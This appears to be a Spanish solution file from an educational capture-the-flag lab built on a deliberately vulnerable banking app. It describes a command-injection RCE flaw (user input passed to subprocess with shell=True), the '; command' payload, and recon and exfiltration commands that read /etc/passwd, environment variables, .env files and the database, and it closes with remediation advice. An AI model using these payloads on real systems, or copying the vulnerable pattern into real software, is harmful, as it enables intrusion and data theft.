╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                     ¡FELICITACIONES, HACKER!                                 ║
║                                                                              ║
║              Has encontrado el archivo de solución del desafío RCE           ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

UBICACIÓN: /opt/scripts/.hidden/

Este directorio contiene herramientas de pentesting del sistema.

ARCHIVO ENCONTRADO:
-------------------
📄 rce_exploit.py - Script de explotación RCE automatizado


CÓMO USAR EL SCRIPT:
--------------------

1. Asegúrate de que el servidor esté corriendo en http://localhost:5000

2. Ejecuta el script:
   python rce_exploit.py

3. Opciones disponibles:
   - [1] Modo Interactivo: Shell RCE completa
   - [2] Demo Automática: Ver demostración de comandos
   - [3] Comando único: Ejecutar un solo comando


COMANDOS ÚTILES PARA PROBAR:
-----------------------------

Reconocimiento:
  whoami          - Usuario actual
  pwd             - Directorio actual  
  id              - ID y grupos del usuario
  uname -a        - Información del sistema

Exploración:
  ls -la          - Listar archivos
  find / -name "*.db" 2>/dev/null    - Buscar bases de datos
  cat /etc/passwd - Ver usuarios del sistema

Exfiltración de datos:
  cat app_banco.py              - Código fuente de la app
  cat banco.db                  - Intentar leer la base de datos
  env                          - Variables de entorno
  cat .env 2>/dev/null         - Archivo de configuración


CÓMO FUNCIONA LA VULNERABILIDAD:
---------------------------------

El código vulnerable en app_banco.py (línea ~170):

    cuenta_destino = request.form.get('cuenta_destino', '')
    resultado = subprocess.check_output(cuenta_destino, shell=True)

El parámetro 'cuenta_destino' se pasa directamente a shell=True sin sanitización.

PAYLOAD DE EXPLOTACIÓN:
; [comando]

Ejemplo:
  Cuenta destino: ; ls -la
  
Esto ejecuta: subprocess.check_output("; ls -la", shell=True)


IMPACTO DE SEGURIDAD:
---------------------
🔴 CRÍTICO - Remote Code Execution (RCE)

Un atacante puede:
✗ Ejecutar comandos arbitrarios en el servidor
✗ Leer archivos sensibles (credenciales, código fuente, base de datos)
✗ Modificar o eliminar archivos
✗ Instalar backdoors
✗ Escalar privilegios
✗ Comprometer completamente el sistema


REMEDIACIÓN:
------------
1. NUNCA usar subprocess con shell=True en datos de usuario
2. Validar y sanitizar TODOS los inputs
3. Usar listas de comandos permitidos (whitelist)
4. Implementar principio de menor privilegio
5. Ejecutar aplicaciones en contenedores con permisos limitados


¿CÓMO ENCONTRASTE ESTE ARCHIVO?
--------------------------------
Deberías haber usado comandos como:

  ; find / -name "*.py" -path "*hidden*" 2>/dev/null
  ; ls -la /opt/scripts/
  ; find /opt -type f -name "*.py"

O explorando manualmente:
  ; ls -la /opt
  ; ls -la /opt/scripts  
  ; ls -la /opt/scripts/.hidden


PRÓXIMOS PASOS:
---------------
1. Estudia el código del exploit
2. Modifícalo para otros objetivos
3. Explora otras vulnerabilidades (OAuth CSRF)
4. Documenta tus hallazgos

╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  "Con gran poder viene gran responsabilidad"                                 ║
║                                                                              ║
║  Este sistema es EDUCATIVO. Las técnicas aprendidas aquí deben usarse       ║
║  ÚNICAMENTE para mejorar la seguridad de sistemas con autorización.         ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
